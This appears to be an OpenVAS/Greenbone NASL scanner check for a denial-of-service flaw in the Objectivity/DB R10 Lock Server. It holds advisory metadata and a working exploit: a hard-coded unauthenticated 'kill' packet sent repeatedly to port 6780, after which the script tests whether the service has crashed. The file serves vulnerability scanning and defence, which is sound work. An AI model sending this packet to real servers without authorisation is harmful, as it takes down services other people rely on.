# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900270");
  script_version("2022-02-17T14:14:34+0000");
  script_tag(name:"last_modification", value:"2022-02-17 14:14:34 +0000 (Thu, 17 Feb 2022)");
  script_tag(name:"creation_date", value:"2011-02-05 04:12:38 +0100 (Sat, 05 Feb 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Objectivity/DB Lock Server Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42901");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45803");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64699");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15988/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(6780);
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
application to crash by sending specific commands.");
  script_tag(name:"affected", value:"Objectivity/DB Version R10");
  script_tag(name:"insight", value:"The flaw is due to Lock Server component allowing to perform
various administrative operations without authentication.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"Objectivity/DB Lock Server is prone to a denial of service (DoS) vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

oolsPort = 6780;
if(!get_port_state(oolsPort)){
  exit(0);
}

## Crafted packet for Lock Server Server
ools_kill_data = raw_string(0x0d, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77,
                            0x00, 0x00, 0x00, 0x04, 0xad, 0xc4, 0xae, 0xda,
                            0x9e, 0x48, 0xd6, 0x44, 0x03, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00);

## Send Crafted packet several times
for(i=0; i < 5; i++)
{
  soc = open_sock_tcp(oolsPort);
  if(!soc){
    exit(0);
  }

  ## Send Crafted packet
  send(socket:soc, data:ools_kill_data);

  ## Close the scocket and wait for 5 seconds
  close(soc);
  sleep(5);

  soc = open_sock_tcp(oolsPort);
  if(!soc)
  {
    security_message(oolsPort);
    exit(0);
  }
  close(soc);
}
